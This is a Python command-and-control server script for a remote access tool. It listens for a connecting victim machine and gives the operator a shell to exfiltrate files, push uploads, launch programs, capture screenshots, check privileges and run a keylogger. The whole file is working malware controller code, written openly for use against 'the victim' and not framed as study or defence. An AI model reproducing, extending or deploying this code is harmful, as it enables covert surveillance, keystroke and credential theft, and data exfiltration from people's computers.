import base64
import socket
import sys
import datetime

SERVER_HOST = "192.168.100.7"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages

def show_help():
    help_option = '''
    - download <path> = Download a file from the victim [E.g., >> download test.txt]

    - upload <path> = Upload a file from the attacker to the victim's local directory [E.g., >> upload test.txt]

    - get <URL> = Download a file from the internet [E.g., >> get http://127.100.0.1/test.txt]

    - start <program> = Start a program in the victim's machine [E.g., >> start Notepad test.txt]

    - screenshot = Take a screenshot of the victim's screen [E.g., >> screenshot]

    - check = Check the privillages [E.g., >> check]

    - keylog_start = Start intercepting keystrokes [E.g., >> keylog_start]

    - keylog_dump = Save the intercepted keystrokes in a txt file in the local directory [E.g., >> keylog_dump]

    - q = Exit the script (E.g., >> q)

    * For more information about the tool, please read the attached README.md *
    '''
    print(help_option)

def reliable_send(cmd):
    client_socket.send(cmd.encode())

def reliable_recv():
    res = client_socket.recv(BUFFER_SIZE).decode()
    return res

def server():
    global client_socket, client_address
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(3)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT}...")
    # Accept the clients
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

def shell():
    ss_count = 0
    while True:
        cmd = input(f'shell $ {client_address[0]}:{client_address[1]} >> ')

        if(cmd == 'q'):
            reliable_send(cmd)
            client_socket.close()
            sys.exit("Connection ended!")

        elif(cmd[:8] == 'download'):
            # reliable_send(cmd)
            # with open(cmd[9:], 'wb') as file:
            #     res = reliable_recv()
            #     file.write(base64.b64decode(res))
            reliable_send(cmd)
            with open(cmd[9:], 'wb') as file:
                file_chunk = client_socket.recv(BUFFER_SIZE)

                if(file_chunk[:4] == '[!!]'):
                    print("Failed to receive the file")
                    break
                else:
                    while(file_chunk):
                        file.write(file_chunk)
                        if(file_chunk[-5:] == b'taken'):
                            break
                        file_chunk = client_socket.recv(BUFFER_SIZE)
        
        elif(cmd[:6] == 'upload'):
            reliable_send(cmd)
            # try:
            #     with open(cmd[7:], 'rb') as fin:
            #         client_socket.send(base64.b64encode(fin.read()))
            # except:
            #     print("Failed to upload")

            try:
                with open(cmd[7:], 'rb') as fin:
                    file_data = fin.read(BUFFER_SIZE)

                    while(file_data):
                        client_socket.send(file_data)
                        file_data = fin.read(BUFFER_SIZE)
                reliable_send('file taken')
            except:
                print("[!!] Failed to upload the file")

        elif(cmd[:10] == 'screenshot'):
            reliable_send(cmd)
            with open(f"screenshot-{ss_count}", 'wb') as file:
                img_chunk = client_socket.recv(BUFFER_SIZE)

                if(img_chunk[:4] == '[!!]'):
                    print("Failed to take screenshot")
                    break
                else:
                    while(img_chunk):
                        file.write(img_chunk)
                        if(img_chunk[-5:] == b'taken'):
                            break
                        img_chunk = client_socket.recv(BUFFER_SIZE)
                    ss_count += 1

        elif(cmd == 'help'):
            show_help()

        elif(cmd[:12] == 'keylog_start'):
            reliable_send(cmd)
            continue

        elif(cmd[:11] == 'keylog_dump'):
            reliable_send(cmd)
            with open(f'keylog-{str(datetime.datetime.now())}.txt', 'wb') as file:
                file_chunk = client_socket.recv(BUFFER_SIZE)

                if(file_chunk[:4] == '[!!]'):
                    print("Failed to receive the keylog file")
                    break
                else:
                    while(file_chunk):
                        file.write(file_chunk)
                        if(file_chunk[-3:] == b'eof'):
                            print('Keylog file saved')
                            break
                        file_chunk = client_socket.recv(BUFFER_SIZE)

        else:
            reliable_send(cmd)
            res = reliable_recv()
            print(res)

server()
shell()
